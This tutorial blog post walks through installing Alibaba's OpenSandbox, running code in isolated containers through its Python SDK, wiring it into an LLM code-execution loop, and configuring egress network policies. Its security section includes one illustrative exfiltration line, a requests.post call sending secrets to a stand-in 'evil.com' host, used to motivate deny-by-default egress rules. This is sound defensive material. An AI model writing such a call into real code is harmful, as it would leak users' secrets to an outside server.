Give Your AI Agents a Safe Place to Run Wild

OpenSandbox is the missing infrastructure layer between "my agent wrote some code" and "oh no it ran rm -rf on my machine"
35 min sandboxing code-execution agents docker kubernetes

What's happening

Here's the problem nobody talks about enough: your AI agents can write code all day long, but where do they run it?

If you've been building coding agents, eval harnesses, or any kind of AI-powered code execution pipeline, you've probably duct-taped something together with Docker containers, subprocess calls, and a prayer. Maybe you've used E2B or Modal, but those are hosted services — your code leaves your infrastructure.

Alibaba just open-sourced OpenSandbox, a self-hosted sandbox platform purpose-built for AI applications. It gives your agents isolated environments to execute code, manage files, and run interpreters — all behind a clean SDK that works in Python, JavaScript, Go, and more.

The killer features: it runs on Docker locally or Kubernetes at scale, has built-in egress network controls (so your sandbox can't phone home to sketchy servers), and provides a unified "Sandbox Protocol" that means you write your integration once and swap runtimes later.

Think of it like giving each AI agent their own little apartment. They can make a mess inside, but they can't burn down the building.

1

Get the Sandbox Server Running Locally

Before we do anything fancy, we need the sandbox server running on our machine. This is the "landlord" — it manages all the little apartments (sandboxes) our AI agents will live in.

OpenSandbox uses Docker under the hood for local development. Each sandbox is basically a container with some extra orchestration on top. The server exposes an API that the SDKs talk to, so you never touch Docker directly.

The setup is refreshingly simple — it's a Python package you install and a config file you generate. No Kubernetes cluster needed for local dev (though it supports K8s when you're ready to scale).

Ask your agent
Get the agent to walk you through installing and starting the OpenSandbox server locally
Think about it
  • What are the prerequisites the agent needs to know about your system? (Docker, Python version, etc.)
  • Should the server run from a pip install or from source? What are the tradeoffs?
  • How will the server know what runtime to use — Docker vs Kubernetes?
What the agent gives back

The agent should give you a short sequence of three commands: install the server package with uv pip install opensandbox-server, generate a Docker config with opensandbox-server init-config ~/.sandbox.toml --example docker, and start the server with opensandbox-server. It should mention that Docker needs to be running first, and that the config file at ~/.sandbox.toml is where you'd tweak settings like timeouts and resource limits later.

Warning
Docker Desktop (or Docker Engine) must be running before you start the server. If you're on macOS, make sure the Docker whale icon is in your menu bar. The server won't give you a helpful error message if Docker is missing — it'll just silently fail when you try to create sandboxes.
Tip
The --example docker flag generates a config tuned for local development. There's also --example kubernetes for production setups. You can always switch later — the SDK code stays the same.
Why not just use Docker directly?

Great question. You could spin up Docker containers yourself, but OpenSandbox gives you three things raw Docker doesn't:

  1. Lifecycle management — automatic cleanup, timeouts, and resource limits so a runaway agent doesn't eat your machine
  2. A file system API — read/write files inside the sandbox without mounting volumes or using docker cp
  3. The code interpreter protocol — a standard way to execute code and get structured results back (stdout, stderr, return values, even charts)

It's the difference between driving a car and building a car from engine parts. Both get you there, but one is a lot less work.

2

Create Your First Sandbox and Run Code Inside It

Now for the fun part. We're going to create a sandbox, run some commands inside it, and manage files — all through the Python SDK.

Mentally, think of what we're about to do in three layers:

  • Sandbox — the isolated container (the apartment)
  • Commands — shell commands you run inside it (like opening a terminal in the apartment)
  • Code Interpreter — a smarter layer that understands programming languages, captures return values, and handles things like matplotlib charts (like having a workbench in the apartment)

The SDK is async, which makes sense — you might want multiple sandboxes running at once, and you don't want to block while waiting for code to execute.

Ask your agent
Get the agent to build a Python script that creates a sandbox, runs a shell command, writes and reads a file, and then executes Python code through the code interpreter
Think about it
  • What image should the sandbox use? (Think about what comes pre-installed in a code interpreter image)
  • The SDK is async — what does that mean for how the script is structured?
  • What's the difference between running a shell command vs. using the code interpreter?
  • How should the sandbox be cleaned up when we're done?
What the agent gives back

The agent should give you an async Python script that does five things in order: creates a sandbox from the opensandbox/code-interpreter:v1.0.1 image, runs an echo command via sandbox.commands.run(), writes a file using sandbox.files.write_files(), reads it back, and then creates a CodeInterpreter to execute a Python snippet. The key insight is that sandbox.commands.run() is for raw shell commands, while interpreter.codes.run() understands programming languages and captures return values separately from stdout. The script should use async with sandbox: for automatic cleanup, or explicitly call sandbox.kill() at the end.

Tip
The async with sandbox: context manager is your friend. It guarantees the sandbox gets killed even if your code throws an exception. Without it, orphaned containers will pile up and eat your disk space.
What's the deal with the Code Interpreter vs. plain commands?

This distinction tripped me up at first. Here's the mental model:

sandbox.commands.run() is like SSHing into a machine and typing a command. You get stdout and stderr back as strings. It's great for pip install, ls, curl — system-level stuff.

interpreter.codes.run() is like having a Jupyter notebook kernel running. It understands code cells, captures the return value of the last expression (not just what gets printed), and can handle rich output like charts and images. When you run result = 2 + 2 followed by result, the code interpreter captures 4 as a structured result, not just a printed line.

For AI agents that generate and execute code, the code interpreter is almost always what you want. It gives you cleaner, more structured output to feed back into the agent's context.

What languages does the code interpreter support?

Out of the box, the code interpreter image supports Python (the SupportedLanguage.PYTHON enum). The architecture is extensible though — the Sandbox Protocol defines a standard interface, so community or custom interpreters for JavaScript, R, Julia, etc. can plug in. Python is the primary citizen here because, let's be honest, that's what 90% of AI-generated code is written in.

✓
At this point you should have the OpenSandbox server running locally and a Python script that creates a sandbox, runs commands, manages files, and executes code through the interpreter. If your sandbox creation hangs, check that Docker is running and that the server is up (you should see logs in the server terminal).

3

Wire It Into an AI Agent Loop

Okay, here's where it gets really interesting. So far we've been running code we wrote inside the sandbox. But the whole point of OpenSandbox is to let an AI agent generate and execute code safely.

The pattern is dead simple:

  1. User asks the agent a question that requires computation
  2. Agent generates Python code to answer it
  3. We run that code in a sandbox
  4. We feed the output back to the agent
  5. Agent interprets the results and responds to the user

This is the "code interpreter" pattern that made ChatGPT's Advanced Data Analysis so powerful. But here, you own the infrastructure. Your data never leaves your servers. And you control exactly what the sandbox can access.

The sandwich looks like: LLM → generated code → sandbox execution → results → LLM → human-readable answer.

Ask your agent
Get the agent to build a simple agent loop that takes a user question, asks an LLM to generate Python code, executes it in an OpenSandbox, and returns the result
Think about it
  • What LLM will you use to generate the code? How should you prompt it to output *only* executable Python?
  • What happens if the generated code throws an error? How should the agent recover?
  • Should the sandbox persist between questions, or create a fresh one each time?
  • How do you prevent the LLM from generating malicious code? (Hint: the sandbox handles this, but think about what extra guardrails you might want)
What the agent gives back

The agent should give you a loop with three main pieces: (1) a system prompt that tells the LLM to output pure Python code when computation is needed, (2) a function that takes that generated code and runs it in an OpenSandbox code interpreter, and (3) a second LLM call that takes the execution results and turns them into a human-friendly answer. The key design decision is sandbox lifecycle — for a multi-turn conversation, keep the sandbox alive so variables and installed packages persist between turns. For one-shot questions, create and destroy per-query. The error handling should capture stderr from the sandbox and feed it back to the LLM for a retry.

Tip
Keep the sandbox alive across a conversation session! If the user asks a follow-up question, their data and variables are still in memory. Create the sandbox when the conversation starts, kill it when it ends. This mimics how Jupyter notebooks work and feels natural to users.
Warning
Never trust LLM-generated code. That's the whole point of sandboxing. But also think about egress — OpenSandbox supports per-sandbox network policies so the generated code can't exfiltrate data to external servers. Check the egress controls section in the docs if you're handling sensitive data.
The retry pattern — letting the agent fix its own bugs

Here's a trick that makes your agent dramatically more reliable: when the sandbox returns an error, feed the error message back to the LLM and ask it to fix the code.

The loop looks like: generate → execute → error? → feed error back to LLM → regenerate → execute again. Cap it at 2-3 retries.

This works shockingly well because LLMs are good at debugging when they can see the actual traceback. It's like pair programming where your partner immediately sees the stack trace and goes "oh, I forgot to import numpy."

The sandbox makes this safe — each retry runs in the same isolated environment, so even if the LLM's "fix" makes things worse, it can't escape the container.

4

Network Policies and Security — The Boring-But-Critical Part

I know, I know — security isn't the sexy part. But if you're running AI-generated code, this is where OpenSandbox really earns its keep.

Think about what a malicious (or just confused) AI agent could do inside a container: download and run arbitrary binaries, exfiltrate your data to a remote server, mine crypto, or spin up a reverse shell. Traditional Docker containers don't prevent any of this — they isolate the filesystem but not the network.

OpenSandbox has two layers of network control:

Ingress Gateway — controls how traffic gets into your sandboxes. Supports multiple routing strategies so you can expose sandbox services (like a web app the agent built) without opening your whole network.

Egress Controls — this is the big one. Per-sandbox rules for what external services the sandbox can talk to. You can allowlist specific domains (like pypi.org for pip installs) and block everything else.

The mental model: ingress is the front door with a security guard. Egress is the phone line — you control who the sandbox can call.

Ask your agent
Get the agent to explain how to configure egress network policies for a sandbox that needs to install pip packages but shouldn't be able to access anything else
Think about it
  • What domains does pip actually need to reach? (It's not just pypi.org)
  • Should you configure this at the server level or per-sandbox?
  • What's the default policy — allow all or deny all? Which is safer for AI-generated code?
What the agent gives back

The agent should explain that egress controls are configured in the ~/.sandbox.toml config file or via the API when creating a sandbox. For a pip-only sandbox, you'd allowlist pypi.org, files.pythonhosted.org, and any mirrors you use, then deny everything else. The agent should note that the default is typically allow-all (for ease of development) and strongly recommend switching to deny-by-default for production. The config is straightforward — a list of allowed domains/IPs per sandbox template.

Warning
Default egress policy is allow-all. This is fine for local development but absolutely not okay for production. If an AI agent generates code that calls requests.post('https://evil.com', data=your_secrets), nothing will stop it unless you configure egress rules.
Tip
For agent evaluation and benchmarking, you often want NO network access at all. The agent's code should work with the data already in the sandbox. A full network deny is the safest option for eval harnesses.
Docker vs. Kubernetes runtime — when to graduate

Docker runtime is perfect for:

  • Local development
  • Single-machine deployments
  • Low-to-medium concurrency (dozens of sandboxes)

Kubernetes runtime is for when you need:

  • Hundreds or thousands of concurrent sandboxes
  • Auto-scaling based on demand
  • Resource quotas and fair scheduling across teams
  • High availability (sandbox server can restart without losing running sandboxes)

The beautiful part is that your SDK code doesn't change. You switch the server config from Docker to Kubernetes, and everything else stays the same. This is what the "Sandbox Protocol" abstraction buys you — runtime portability.

Alibaba claims their K8s runtime is "high-performance" with sub-second sandbox creation. That matters when you're running RL training loops that need thousands of sandboxes per hour.

✓
You now understand the full stack: server setup, sandbox lifecycle, code execution (commands vs. interpreter), wiring it into an agent loop, and network security policies. You've got the mental model for building a production-grade code execution backend for AI agents.

Recap

We just walked through the full stack of giving AI agents a safe, isolated environment to execute code — from installing the OpenSandbox server to wiring it into an agent loop with proper security controls.

Here's what's exciting about this: until recently, sandboxed code execution for AI was either a hosted service (you send your code to someone else's servers) or a DIY Docker mess (you spend a week building what should be a library). OpenSandbox sits in the sweet spot — open source, self-hosted, and designed specifically for the weird requirements of AI applications (fast creation, rich output capture, network isolation, multi-language support).

The pattern we built — LLM generates code → sandbox executes it → results feed back to LLM — is the foundation for coding agents, data analysis copilots, eval harnesses, and RL training environments. It's the same pattern powering ChatGPT's Code Interpreter, Devin's code execution, and dozens of agent frameworks. Now you can run it on your own infrastructure.

  • OpenSandbox separates the sandbox server (lifecycle management) from the SDK (your code), so you can swap Docker for Kubernetes without changing your application
  • The code interpreter captures structured results (return values, images) — not just stdout — which makes it far more useful for AI agents than raw shell execution
  • Egress network controls are critical for production: default deny-all, then allowlist only what the sandbox actually needs (like pypi.org for package installs)
  • The retry pattern (execute → error → feed error back to LLM → retry) dramatically improves agent reliability, and sandboxing makes it safe to retry even broken code
  • For high-volume scenarios like RL training or batch evals, the Kubernetes runtime with pre-built images gives you sub-second sandbox creation at scale

Where to go next

  • Explore the examples/ directory in the OpenSandbox repo — there are demos for browser automation (Chrome, Playwright) and desktop environments (VNC) that go way beyond code execution
  • Try building a multi-turn coding agent that keeps the sandbox alive across a conversation, so the user can iteratively refine their analysis
  • Set up egress policies and test them by having an agent try to make network requests — verify that unauthorized requests get blocked
  • If you're working at scale, spin up the Kubernetes runtime and benchmark sandbox creation times for your workload
